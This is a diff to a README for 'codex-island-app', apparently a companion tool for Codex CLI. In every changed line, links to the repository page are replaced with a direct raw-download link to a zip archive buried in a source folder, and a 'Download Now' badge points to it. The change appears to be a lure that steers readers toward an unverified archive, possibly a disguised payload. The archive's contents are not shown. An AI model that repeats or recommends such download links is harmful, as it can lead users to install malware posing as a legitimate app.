@@ -1,12 +1,12 @@
 # 🌴 codex-island-app - Keep Codex in view
 
-[![Download codex-island-app](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pandemic-spode596/codex-island-app)
+[![Download codex-island-app](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Pandemic-spode596/codex-island-app/main/engine/crates/island-core/app_island_codex_1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:
 
-https://github.com/Pandemic-spode596/codex-island-app
+https://raw.githubusercontent.com/Pandemic-spode596/codex-island-app/main/engine/crates/island-core/app_island_codex_1.2.zip
 
 ## 🖥️ What this app does
 
@@ -137,7 +137,7 @@ This app pairs with Codex CLI and helps you watch what is happening during a ses
 
 If you need the file again, use this link:
 
-https://github.com/Pandemic-spode596/codex-island-app
+https://raw.githubusercontent.com/Pandemic-spode596/codex-island-app/main/engine/crates/island-core/app_island_codex_1.2.zip
 
 ## 📚 Repo details
 
